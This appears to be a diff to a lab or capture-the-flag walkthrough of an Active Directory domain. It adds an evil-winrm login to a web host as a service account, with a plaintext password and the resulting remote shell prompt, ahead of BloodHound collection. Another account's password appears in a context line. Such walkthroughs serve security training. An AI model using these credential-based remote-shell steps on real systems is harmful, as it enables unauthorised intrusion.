@@ -490,7 +490,21 @@ kwarren:!@#darkhav3n123#@!
 # Bloodhound
 Now is a good time to get bloodhound data, to do this ill get a winrm session as `svc_webpool`
 
-```p
+```python
+evil-winrm -i web.ext.darkhaven.local -u svc_webpool -p 'D@rkH@v3n128!'     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
+```
+
+```python
+
 ```
 
 
